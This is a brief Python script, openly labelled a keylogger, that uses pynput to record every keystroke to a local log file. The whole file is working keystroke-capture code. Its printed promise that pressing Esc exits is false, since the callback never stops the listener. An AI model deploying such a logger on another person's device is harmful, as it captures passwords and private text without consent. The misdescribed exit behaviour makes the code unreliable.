from pynput.keyboard import Listener

# Path to the log file where keystrokes will be saved
log_file = "keystrokes.log"

def on_press(key):
    """
    Callback function called when a key is pressed.
    It logs the pressed key to the log file.
    
    Parameters:
        key (str): The key pressed.
    """
    with open(log_file, "a") as f:
        f.write(str(key) + "\n")

def main():
    print("Keylogger is running. Press 'Esc' to exit.")
    with Listener(on_press=on_press) as listener:
        listener.join()

if __name__ == "__main__":
    main()
